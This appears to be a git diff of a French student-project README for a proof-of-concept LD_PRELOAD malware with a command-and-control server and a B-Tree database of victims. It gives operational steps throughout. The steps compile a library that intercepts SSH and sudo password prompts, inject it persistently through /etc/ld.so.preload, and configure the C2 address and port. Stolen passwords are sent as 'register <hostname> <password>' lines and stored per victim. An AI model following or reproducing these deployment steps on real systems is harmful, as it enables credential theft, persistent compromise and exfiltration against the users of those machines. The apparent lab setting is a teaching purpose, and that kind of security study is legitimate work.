@@ -8,88 +8,131 @@ Ce projet est un POC complet d’un malware basé sur `LD_PRELOAD`, capable d’
 
 ## 📁 Structure du projet
 
-```
-Project_Root/
-├── LD_PRELOAD/         # Malware intercepteur LD_PRELOAD
-│   ├── malware.c
-│   ├── send_to_c2.c
-│   ├── Makefile
-│   ├── add_to_ldso.sh
-│   └── ...
-│
-├── server/             # Serveur C2 (Command & Control)
-│   ├── server.c
-│   ├── server.h
-│   ├── Makefile
-│   └── ...
-│
-└── BTreeDB/            # Base de données en C avec B-Tree
-     └── ...
-```
+CC1-DATABASE-ESGI/
+├── server/
+│ ├── server.c
+│ ├── register_victim.c
+│ ├── Makefile
+│ └── ...
+├── BTreeDB/
+│ ├── author.md
+│ ├── btree.c/.h/.o
+│ ├── table.c/.h/.o
+│ ├── repl.c/.h/.o
+│ ├── persistence.c/.h/.o
+│ ├── main.c/.o
+│ ├── database.db # base des victims
+│ ├── id_counter.txt # ID auto-incrémenté
+│ ├── db.txt, db/, tests/
+│ ├── Makefile, README.md
+│ └── BTreeProject/
+├── LD_PRELOAD/malware/
+│ ├── malware.c
+│ ├── send_to_c2.c
+│ ├── malware.so
+│ ├── Makefile
+│ └── install_ldso_preload.sh
+└── README.md
 
 ---
 
-## 💣 Malware LD_PRELOAD
+## 💻 VM 1 – Serveur C2 (192.168.1.20)
 
-### Fonctionnalités :
-- Intercepte les fonctions `read()` et `write()` pour capturer les mots de passe SSH
-- Enregistre les identifiants localement dans `/dev/shm/.creds`
-- Envoie automatiquement les credentials au serveur C2 via TCP sur le port `5555`
-- Bloque l'accès aux fichiers sensibles comme `/etc/passwd`
+### 🛠️ Prérequis
 
-### Compilation :
-```bash
-cd LD_PRELOAD
+- OpenSSH installé :
+
+  sudo apt install openssh-server
+🔧 Compilation du serveur + base
+
+cd ~/server/CC1-DATABASE-ESGI/server
+make clean
 make
-```
+🚀 Lancer le serveur C2
 
-### Utilisation :
-```bash
-chmod +x add_to_ldso.sh
-./add_to_ldso.sh
-```
-
-### Test de bon fonctionnement :
-```bash
-cat /etc/passwd
-sudo cat /etc/passwd
-LD_PRELOAD=$PWD/malware.so ssh user@ip_serveur
-```
-
----
-
-## 📡 Serveur Command & Control (C2)
-
-### Installation du serveur SSH (VM C2) :
-```bash
-sudo apt update
-sudo apt install openssh-server
-sudo nano /etc/ssh/sshd_config
-# Modifier ou ajouter : Port 5555
-sudo systemctl enable ssh
-sudo systemctl start ssh
-```
-
-### Fonctionnalités :
-- Écoute sur le port `5555`
-- Reçoit les messages de type : `register hostname password`
-- Transfère automatiquement les données à la base de données locale (dossier `db_c`)
-
-### Compilation & Exécution :
-```bash
-cd server
-make
 ./server
-```
+Le serveur écoute sur le port 5555
+Il reçoit :
 
----
+register <hostname> <password> → stocké dans la base BTree
 
-## 🗃️ Base de Données B-Tree en C
+log <hostname> <cmd> → affiché dans le terminal
 
-Voir README.md dans BTreeDB
+💻 VM 2 – Malware (192.168.1.15)
+🛠️ Prérequis
+OpenSSH installé :
+
+sudo apt install openssh-server
+⚠️ Configuration du malware
+Dans send_to_c2.c, modifier l’IP du serveur (ligne #define C2_IP "...") :
 
 
----
+#define C2_IP "192.168.1.20"
+#define C2_PORT 5555
+Vous pouvez aussi modifier le port C2 si nécessaire.
+
+🔧 Compilation
+
+cd ~/mal/CC1-DATABASE-ESGI/LD_PRELOAD/malware
+make
+🐚 Injection automatique via LD_PRELOAD
+
+chmod +x install_ldso_preload.sh
+sudo ./install_ldso_preload.sh
+Cela ajoute le chemin absolu de malware.so dans /etc/ld.so.preload
 
 
+| Fonction                         | Description                                                                                                                                               |
+| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 🔑 Exfiltration de mot de passe  | Intercepte les entrées `password:` dans un terminal                                                                                                       |
+| 📦 Envoi vers serveur C2         | Format : `register <hostname> <mdp>`                                                                                                                      |
+| 🚫 Blocage de fichiers sensibles: Empêche `open()` sur sudo /etc/passwd`, `/etc/shadow`, etc. Exemple : `sudo cat /etc/passwd` → Permission denied▪️ ` cat /etc/passwd` → aussi bloqué |
 
+| 🧠 Injection automatique via SSH | Vous pouvez tester avec :<br>▪️ `LD_PRELOAD=./malware.so ssh name@192.168.1.xx`                                                                               |
+| 💾 Persistance dans BTree        | Chaque victime est stockée dans `database.db` avec ID unique                                                                                              |
+| 🔁 Injection persistante         | Automatique via `/etc/ld.so.preload`                                                                                   
+
+🔍 Vérification de la base
+Sur la VM C2 :
+
+cd ../BTreeDB
+./db
+Dans la CLI :
+
+
+select
+Vous verrez (le register el le mdp de la connexion ssh):
+ex
+(1, anisdebian, 1478)
+(2, onur, 1234)
+
+🧪 Exemple de test
+Lancer le serveur C2 sur VM1 :
+./server
+
+
+Sur la VM malware, compiler et injecter :
+
+
+make
+chmod +x install_ldso_preload.sh
+sudo ./install_ldso_preload.sh
+Se connecter à une machine distante via SSH (ou exécuter sudo ls)
+exemple :
+LD_PRELOAD=./malware.so ssh nom@192.168.1.xx (ip)
+
+
+→ password: sera intercepté sur le serverc2
+Vérifier la base côté serveur :
+
+cd ../BTreeDB
+./db
+> select (pour parcourir l'arbre et voir ceux qui est insert)
+autre commande expliqué dans la db
+
+
+❌ Pour désactiver le malware
+
+sudo rm /etc/ld.so.preload
+📎 Remarques
+Le fichier database.db est mis à jour automatiquement.
